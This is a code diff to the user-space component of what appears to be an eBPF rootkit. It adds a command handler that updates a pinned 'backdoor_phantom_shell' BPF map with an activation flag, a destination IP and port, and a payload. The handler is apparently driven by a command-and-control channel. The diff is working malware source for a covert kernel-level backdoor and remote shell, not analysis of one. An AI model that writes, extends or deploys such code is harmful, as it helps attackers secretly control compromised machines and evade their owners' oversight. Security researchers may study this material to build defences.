@@ -16,6 +16,7 @@
 #include "../common/constants.h"
 #include "../common/map_common.h"
 #include "../common/c&c.h"
+#include "../common/struct_common.h"
 #include "include/utils/files/path.h"
 #include "include/utils/strings/regex.h"
 #include "include/utils/structures/fdlist.h"
@@ -27,6 +28,8 @@
 		fprintf(stderr, msg);\
 		goto cleanup\
 	}
+
+static int FD_TC_MAP;
 
 static struct env {
 	bool verbose;
@@ -132,6 +135,22 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 			default:
 				printf("Command received unknown: %d\n", e->code);
 		}
+	}else if(e->event_type == PSH_UPDATE){
+		printf("Requested to update the phantom shell\n");
+		int key = 1;
+		struct backdoor_phantom_shell_data data;
+		int err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
+		if(err<0) {
+			printf("Failed to read the shared map\n");
+			return -1;
+		}
+		printf("Pre value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
+		data.active = e->bps_data.active;
+		data.d_ip = e->bps_data.d_ip;
+		data.d_port = e->bps_data.d_port;
+		memcpy(data.payload, e->bps_data.payload, 64);
+		printf("Post value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
+		bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
 	}else{
 		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
 		return -1;
@@ -182,17 +201,11 @@ int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info
 	return 0;
 }
 
-struct backdoor_phantom_shell_data{
-	int active;
-	__u32 d_ip;
-	__u16 d_port;
-};
-
 int main(int argc, char**argv){
     struct ring_buffer *rb = NULL;
     struct kit_bpf *skel;
-	struct bpf_map_info map_expect = { 0 };
-	struct bpf_map_info info = { 0 };
+	struct bpf_map_info map_expect = {0};
+	struct bpf_map_info info = {0};
     __u32 err;
 
 	//Ready to be used
@@ -267,17 +280,17 @@ int main(int argc, char**argv){
 		goto cleanup;
 	}
 
-	int tc_efd = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
-	printf("TC MAP ID: %i\n", tc_efd);
+	FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
+	printf("TC MAP ID: %i\n", FD_TC_MAP);
 	map_expect.key_size    = sizeof(__u64);
 	map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
 	map_expect.max_entries = 1;
-	err = check_map_fd_info(tc_efd, &info, &map_expect);
+	err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
 	if (err) {
 		fprintf(stderr, "ERR: map via FD not compatible\n");
 		return err;
 	}
-	printf("\nCollecting stats from BPF map\n");
+	printf("Collected stats from BPF map:\n");
 	printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
 			" key_size:%d value_size:%d max_entries:%d\n",
 			info.type, info.id, info.name,
@@ -285,11 +298,12 @@ int main(int argc, char**argv){
 			);
 	int key = 1;
 	struct backdoor_phantom_shell_data data;
-	err = bpf_map_lookup_elem(tc_efd, &key, &data);
+	err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
 	if(err<0) {
 		printf("Failed to lookup element\n");
 	}
-	printf("%i, %i, %i\n", data.active, data.d_ip, data.d_port);
+	printf("Value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
+	//bpf_map_update_elem(tc_efd, &key, &data, 0);
 
 	/*bpf_obj_get(NULL);
 	char* DIRECTORY_PIN = "/sys/fs/bpf/mymaps";
